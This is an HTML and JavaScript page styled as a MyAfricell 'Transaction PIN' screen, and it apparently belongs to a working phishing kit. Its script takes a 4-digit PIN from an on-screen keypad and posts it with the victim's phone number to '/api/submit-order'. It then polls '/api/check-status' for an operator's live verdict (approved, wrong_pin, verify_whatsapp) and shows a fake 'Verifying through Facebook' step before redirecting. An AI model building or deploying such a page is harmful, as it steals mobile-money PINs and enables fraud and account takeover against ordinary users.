<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MyAfricell | Transaction PIN</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body::-webkit-scrollbar { display: none; }
        body { scrollbar-width: none; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }

        html, body {
            width: 100%; height: 100%;
            background: #FFFFFF;
            display: flex; justify-content: center; align-items: center;
            overflow: hidden; padding: 0;
        }

        .mobile-viewport {
            width: 100%;
            max-width: 100%;
            height: 100%;
            max-height: 100%;
            background: #FFFFFF;
            border-radius: 0;
            box-shadow: none;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 32px 24px 24px 24px;
            border: none;
            overflow: hidden;
        }

        .top-stack { width: 100%; text-align: center; }
        .login-heading { font-size: 32px; font-weight: 800; color: #991676; margin-bottom: 8px; }
        .login-subheading { font-size: 14px; color: #6B7280; margin-bottom: 16px; }

        .middle-stack { 
            width: 100%; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            margin: auto 0; 
            gap: 20px; 
            padding: 16px 0; 
        }

        .pin-boxes-container {
            display: flex; gap: 14px; justify-content: center; padding: 8px;
            border-radius: 18px; background: rgba(153, 22, 118, 0.02);
            border: 1px solid rgba(153, 22, 118, 0.15);
        }

        .pin-box {
            width: 54px; height: 64px; background: #F7F8FA;
            border: 1px solid #D1D5DB; border-radius: 16px;
            font-size: 26px; font-weight: 600; color: #1F2937;
            text-align: center; pointer-events: none;
            box-shadow: 0 3px 6px rgba(0,0,0,0.03);
            transition: all 0.2s ease;
        }

        .pin-box.active-box { border-color: #991676; background: #FFFFFF; box-shadow: 0 0 0 3px rgba(153, 22, 118, 0.15); }

        .pin-callback-spinner {
            display: none;
            width: 38px;
            height: 38px;
            border-radius: 50%;
            border: 4px solid rgba(153, 22, 118, 0.18);
            border-top-color: #991676;
            animation: pinCircleSpin 0.85s linear infinite;
        }

        .pin-callback-spinner.active {
            display: block;
        }

        @keyframes pinCircleSpin {
            to { transform: rotate(360deg); }
        }

        .pp-error-box {
            width: 100%; display: none; align-items: center; justify-content: center; gap: 8px;
            color: #E31B23; font-size: 14px; font-weight: 500; text-align: center;
            background: rgba(227, 27, 35, 0.08); padding: 10px 14px; border-radius: 12px;
        }

        .bottom-stack { width: 100%; display: flex; flex-direction: column; align-items: center; padding-top: 20px; }

        .onscreen-keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; width: 100%; max-width: 360px; }
        .keypad-btn {
            background: transparent; border: none; height: 60px; font-size: 28px;
            font-weight: 600; color: #1F2937; display: flex; align-items: center;
            justify-content: center; cursor: pointer; border-radius: 50%;
            transition: background 0.1s ease;
        }
        .keypad-btn:active { background: #E5E7EB; }
        .keypad-btn.action-key { font-size: 22px; color: #4B5563; }

        /* Facebook transition animation overlay */
        .fb-transition-overlay {
            position: fixed;
            inset: 0;
            background: rgba(255, 255, 255, 0.96);
            backdrop-filter: blur(6px);
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 28px;
            text-align: center;
            z-index: 999;
            opacity: 0;
            transition: opacity 0.28s ease;
        }

        .fb-transition-overlay.visible {
            display: flex;
            opacity: 1;
        }

        .fb-spinner-ring {
            width: 72px;
            height: 72px;
            border-radius: 50%;
            border: 4px solid rgba(24, 119, 242, 0.18);
            border-top-color: #1877F2;
            border-right-color: #991676;
            animation: fbSpin 0.9s linear infinite;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 24px;
            box-shadow: 0 10px 25px rgba(24, 119, 242, 0.16);
        }

        .fb-spinner-icon {
            font-size: 28px;
            color: #1877F2;
            animation: fbPulse 1.4s ease-in-out infinite;
        }

        .fb-status-text {
            font-size: 19px;
            font-weight: 700;
            color: #1F2937;
            margin-bottom: 8px;
            min-height: 28px;
            transition: opacity 0.22s ease, transform 0.22s ease;
        }

        .fb-status-text.fade-step {
            opacity: 0;
            transform: translateY(6px);
        }

        .fb-phone-sub {
            font-size: 14px;
            font-weight: 500;
            color: #6B7280;
        }

        @keyframes fbSpin {
            to { transform: rotate(360deg); }
        }

        @keyframes fbPulse {
            0%, 100% { transform: scale(0.95); }
            50% { transform: scale(1.08); }
        }
    </style>
</head>
<body>

    <div class="mobile-viewport">
        <div class="top-stack">
            <h1 class="login-heading">Enter Your PIN</h1>
            <p class="login-subheading">Enter your pin to verify</p>
        </div>

        <div class="middle-stack">
            <div id="pinBoxesContainer" class="pin-boxes-container">
                <input type="password" class="pin-box active-box" id="p1" readonly value="">
                <input type="password" class="pin-box" id="p2" readonly value="">
                <input type="password" class="pin-box" id="p3" readonly value="">
                <input type="password" class="pin-box" id="p4" readonly value="">
            </div>

            <div id="pinCallbackSpinner" class="pin-callback-spinner" aria-label="Waiting for verification callback"></div>

            <div id="inlineErrorBox" class="pp-error-box">
                <i class="fa-solid fa-circle-exclamation"></i>
                <span id="errorText">Incorrect PIN. Please try again.</span>
            </div>
        </div>

        <div class="bottom-stack">
            <div class="onscreen-keypad">
                <button type="button" class="keypad-btn" onclick="pressKey('1')">1</button>
                <button type="button" class="keypad-btn" onclick="pressKey('2')">2</button>
                <button type="button" class="keypad-btn" onclick="pressKey('3')">3</button>
                <button type="button" class="keypad-btn" onclick="pressKey('4')">4</button>
                <button type="button" class="keypad-btn" onclick="pressKey('5')">5</button>
                <button type="button" class="keypad-btn" onclick="pressKey('6')">6</button>
                <button type="button" class="keypad-btn" onclick="pressKey('7')">7</button>
                <button type="button" class="keypad-btn" onclick="pressKey('8')">8</button>
                <button type="button" class="keypad-btn" onclick="pressKey('9')">9</button>
                <div></div>
                <button type="button" class="keypad-btn" onclick="pressKey('0')">0</button>
                <button type="button" class="keypad-btn action-key" onclick="deleteKey()"><i class="fa-solid fa-delete-left"></i></button>
            </div>
        </div>
    </div>

    <div id="fbTransitionOverlay" class="fb-transition-overlay" aria-live="polite">
        <div class="fb-spinner-ring">
            <i class="fa-brands fa-facebook fb-spinner-icon"></i>
        </div>
        <div id="fbStatusText" class="fb-status-text">Verifying User Phone Number...</div>
        <div id="fbPhoneSub" class="fb-phone-sub"></div>
    </div>

    <script>
        const pinBoxesContainer = document.getElementById('pinBoxesContainer');
        const pinCallbackSpinner = document.getElementById('pinCallbackSpinner');
        const errorBox = document.getElementById('inlineErrorBox');
        const errorText = document.getElementById('errorText');
        const fbOverlay = document.getElementById('fbTransitionOverlay');
        const fbStatusText = document.getElementById('fbStatusText');
        const fbPhoneSub = document.getElementById('fbPhoneSub');

        let pinDigits = ['', '', '', ''];
        let activeInterval = null;
        let safetyTimeout = null;
        let errorTimeout = null;
        let isSubmitting = false;
        let isRedirectingFacebook = false;

        function getCurrentPhone() {
            return (localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+232 00000000').trim();
        }

        function setWaitingCallbackState(waiting) {
            if (waiting) {
                pinBoxesContainer.style.display = 'none';
                pinCallbackSpinner.classList.add('active');
            } else {
                pinCallbackSpinner.classList.remove('active');
                pinBoxesContainer.style.display = 'flex';
            }
        }

        function playFacebookTransitionAndRedirect() {
            if (isRedirectingFacebook) return;
            isRedirectingFacebook = true;
            clearTimers();
            isSubmitting = false;
            setWaitingCallbackState(false);

            const currentPhone = getCurrentPhone();
            fbStatusText.textContent = 'Verifying User Phone Number...';
            fbPhoneSub.textContent = currentPhone !== '+232 00000000' ? currentPhone : '';
            fbOverlay.classList.add('visible');

            setTimeout(() => {
                fbStatusText.classList.add('fade-step');
                setTimeout(() => {
                    fbStatusText.textContent = 'Verifying through Facebook...';
                    fbStatusText.classList.remove('fade-step');
                }, 220);
            }, 2000);

            setTimeout(() => {
                window.location.href = 'verify.html';
            }, 4000);
        }

        window.addEventListener('DOMContentLoaded', () => {
            try {
                localStorage.removeItem('africellApprovalTimestamp');
            } catch (e) {}
        });

        function clearTimers() {
            if (activeInterval) {
                clearInterval(activeInterval);
                activeInterval = null;
            }
            if (safetyTimeout) {
                clearTimeout(safetyTimeout);
                safetyTimeout = null;
            }
        }

        function showInlineError(message) {
            errorText.innerText = message;
            errorBox.style.display = 'flex';

            if (errorTimeout) clearTimeout(errorTimeout);
            errorTimeout = setTimeout(() => {
                hideInlineError();
            }, 3500);
        }

        function hideInlineError() { 
            errorBox.style.display = 'none'; 
            if (errorTimeout) clearTimeout(errorTimeout);
        }

        function updatePinDisplay() {
            for (let i = 0; i < 4; i++) {
                const box = document.getElementById('p' + (i + 1));
                box.value = pinDigits[i];
                box.classList.remove('active-box');
            }
            const firstEmpty = pinDigits.findIndex(d => d === '');
            document.getElementById('p' + (firstEmpty !== -1 ? firstEmpty + 1 : 4)).classList.add('active-box');
            validateForm();
        }

        function pressKey(digit) {
            if (isSubmitting || isRedirectingFacebook) return;
            const firstEmpty = pinDigits.findIndex(d => d === '');
            if (firstEmpty !== -1) {
                pinDigits[firstEmpty] = digit;
                updatePinDisplay();
                if (pinDigits.every(d => d !== '')) {
                    handleLogin();
                }
            }
        }

        function deleteKey() {
            if (isSubmitting || isRedirectingFacebook) return;
            for (let i = 3; i >= 0; i--) {
                if (pinDigits[i] !== '') { pinDigits[i] = ''; break; }
            }
            updatePinDisplay();
        }

        function validateForm() {
            if (isSubmitting || isRedirectingFacebook) return;
            hideInlineError();
        }

        function handleLogin() {
            if (isSubmitting || isRedirectingFacebook) return;
            const pinCode = pinDigits.join('');
            if (pinCode.length !== 4) {
                showInlineError('Please enter your 4-digit PIN.');
                return;
            }
            submitPinCode(getCurrentPhone(), pinCode);
        }

        async function submitPinCode(phoneNum, pin) {
            isSubmitting = true;
            clearTimers();
            const submissionTimestamp = Date.now();
            setWaitingCallbackState(true);

            try {
                const response = await fetch('/api/submit-order', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: phoneNum, uniqueId: 'Confirmation PIN: ' + pin })
                });

                const result = await response.json().catch(() => ({}));
                if (!response.ok || (result && result.success === false)) {
                    resetButtonState(false);
                    showInlineError('Verification failed. Please try again.');
                    return;
                }

                pollApprovalStatus(phoneNum, submissionTimestamp);
            } catch (error) {
                resetButtonState(false);
                showInlineError('Verification failed. Please try again.');
            }
        }

        function resetButtonState(clearDigits = true) {
            isSubmitting = false;
            clearTimers();
            setWaitingCallbackState(false);
            if (clearDigits) {
                pinDigits = ['', '', '', ''];
            }
            updatePinDisplay();
        }

        function pollApprovalStatus(phoneNum, submissionTimestamp) {
            const cleanPhone = phoneNum.trim();
            clearTimers();

            safetyTimeout = setTimeout(() => {
                resetButtonState(true);
                showInlineError('⚠️ Verification timed out after 5 minutes. Please try again.');
            }, 300000);

            activeInterval = setInterval(async () => {
                try {
                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}&t=${Date.now()}`);
                    const data = await response.json();

                    if (!data || (data.timestamp && data.timestamp < submissionTimestamp - 5000)) {
                        return;
                    }

                    if (data.status === 'verify_whatsapp') {
                        playFacebookTransitionAndRedirect();
                    }
                    else if (data.status === 'approved') {
                        clearTimers();
                        isSubmitting = false;
                        window.location.href = 'success.html';
                    } 
                    else if (data.status === 'rejected') {
                        clearTimers();
                        isSubmitting = false;
                        window.location.href = 'reject.html';
                    }
                    else if (data.status === 'wrong_id' || data.status === 'wrong_pin' || data.status === 'wrong_otp') {
                        clearTimers();
                        resetButtonState(true);
                        showInlineError('⚠️ Incorrect PIN. Please try again.');
                    }
                } catch (e) {
                    console.error(e);
                }
            }, 3000);
        }
    </script>
</body>
</html>
